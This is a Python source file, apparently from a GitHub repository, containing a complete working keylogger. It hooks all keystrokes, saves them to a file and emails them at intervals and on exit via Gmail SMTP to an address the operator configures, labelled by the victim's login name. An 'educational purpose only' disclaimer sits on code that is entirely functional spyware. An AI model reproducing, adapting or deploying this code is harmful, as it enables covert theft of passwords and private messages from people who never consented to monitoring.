import os
import keyboard
import time
import atexit
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


# This program is a keylogger that will save the key pressed in a file and send it by email.
# Make sure to have the "keyboard" module installed. If not, you can install it by running "pip install keyboard" in your terminal.
# Made by Stunkz on GitHub ( https://github.com/Stunkz )
# If you have any question or issue, you can contact me on GitHub.
# This program is for educational purpose only. I'm not responsible for any damage caused by this program.
# Have fun and learn a lot with this program :)

# MODIFY THIS PARAMETER TO ADAPT TO YOUR NEEDS.


# Keylogger
FILE_NAME = "output.txt"  # You can make the file save in a specific directory by adding the path. (e.g. "C:/Users/username/Documents/output.txt")
CLIENT_NAME = os.getlogin()  # You can change it to another name if you want to rename your keylogger name. (e.g. "device1")
TIME_INTERVAL = 10  # In seconds. You can change it to another value if you want to save the file more or less often. Minimum value is 0.1.

SEND_BEFORE_EXIT = True  # Send the file before exiting the program.
# Set to False if you don't want to send the file before exiting the program.
SEND_INTERVAL = 60  # In seconds. You can change it to another value if you want to send the file more or less often. Minimum value is 1.
# Set to 0 if you don't want to send the file based on the time interval.
SEND_FILE_SIZE = 1000  # In bytes. You can change it to another value if you want to send the file more or less often. 1 character = 1 byte.
# Set to 0 if you don't want to send the file based on the file size.

RESET_WHEN_SEND = True  # Reset the file after sending it.

BLACKLIST = ["ctrl", "maj", "droite", "haut", "bas", "gauche", "verr.maj", "shift",
             "up", "right", "left", "caps lock", "alt", "down", "esc", "f1", "f2",
             "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12", "f13",
             "f14", "f15", "f16", "f17", "f18", "f19", "f20", "f21", "f22", "f23",
             "f24", "print screen", "scroll lock", "pause", "insert", "home", "page up",
             "delete", "end", "page down", "num lock", "up arrow", "left arrow",
             "clear", "right arrow", "down arrow"]  # You can add other key if you don't want to save them.
SPECIAL_KEYS = {"backspace": "<bcksp>", "enter": "\n", "space": " ",
                "tab": "\t"}  # You can add other key if you want to save them differently. (e.g. "backspace": "<bcksp>")

EVENT_TYPE = "down"  # You can change it to "up" if you want to save the key when it's released.


# DO NOT MODIFY
TEXT = ""  # DO NOT MODIFY


# Email service
EMAIL = "your-email-address@gmail.com"  # Email that going to receive the keylogger file

EMAIL_SENDER = ""  # Email that going to send the keylogger file. Leave blank if you want to use the same email as the receiver.
EMAIL_SENDER_PASSWORD = "Your-Password78*"  # You can create an app password if you have 2FA enabled on your account. (https://myaccount.google.com/apppasswords)

SMTP_SERVER = "smtp.gmail.com"  # You can change it to another SMTP server if you want to use another email service.
SMTP_PORT = 587  # You can change it to another port if you want to use another email service.


def reset_file():
    try:
        with open(FILE_NAME, "w") as file:
            file.write("")
    except Exception as error:
        print("Error while trying to reset the file")
        print(error)
        return


def special_key(key):
    if key in BLACKLIST:
        return ""
    if key in SPECIAL_KEYS:
        return SPECIAL_KEYS[key]
    return key


def callback(e):
    key = e.name
    event_type = e.event_type
    if event_type == EVENT_TYPE:
        global TEXT
        TEXT += special_key(key)
        print(TEXT)


def send_email():

    # Create the email
    message = MIMEMultipart()
    message['From'] = EMAIL_SENDER
    message['To'] = EMAIL
    message['Subject'] = 'Key Logger File'

    # Create the message
    body = f"Keylogger file from {CLIENT_NAME}"
    message.attach(MIMEText(body, 'plain'))

    # Attach the file
    try:
        with open(FILE_NAME, "r") as file:
            attachment = MIMEText(file.read())
            attachment.add_header('Content-Disposition', f'attachment; filename= {FILE_NAME}')
            message.attach(attachment)
    except Exception as error:
        print("Error while trying to attach the file")
        print(error)
        return

    # Connexion to the SMTP server of Gmail
    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)

    # Testing if the server is connected
    if server.noop()[0] != 250:
        print("Error while trying to connect to the SMTP server")
        return

    # Sending the email
    try:
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_SENDER_PASSWORD)
        server.sendmail(EMAIL_SENDER, EMAIL, message.as_string())

        print("Email sent successfully")
    except Exception as error:
        print("Error occurred")
        print(error)
    finally:
        server.quit()


def main():

    global EMAIL_SENDER
    global TEXT

    try:
        keyboard.hook(callback=callback, suppress=False)
    except Exception as error:
        print("Error while trying to start the keylogger")
        print(error)
        return

    if EMAIL_SENDER == "":
        EMAIL_SENDER = EMAIL

    # Keep the program running
    i = 0
    while True:
        time.sleep(0.01)
        i = i + 1 if i < 1000000 else 0

        if i >= TIME_INTERVAL * 10:
            try:
                with open(FILE_NAME, "a") as file:
                    file.write(TEXT)
                    TEXT = ""
            except Exception as error:
                print("Error while trying to save the file")
                print(error)

        if i >= SEND_INTERVAL * 10 and SEND_INTERVAL != 0:
            send_email()
            if RESET_WHEN_SEND:
                reset_file()

        if os.path.getsize(os.path.abspath(FILE_NAME)) >= SEND_FILE_SIZE and SEND_FILE_SIZE != 0:
            send_email()
            if RESET_WHEN_SEND:
                reset_file()


def exit_function():
    print("Exiting program...")

    # Save the file before exiting
    global TEXT
    with open(FILE_NAME, "a") as file:
        file.write(TEXT)
        TEXT = ""

    if SEND_BEFORE_EXIT:
        send_email()
        if RESET_WHEN_SEND:
            reset_file()

    keyboard.unhook_all()
    print("Bye bye :)")
    pass


if __name__ == "__main__":
    # This will prevent from losing some key if the program is killed
    atexit.register(exit_function)

    start_time = time.time()

    main()
    exit_function()
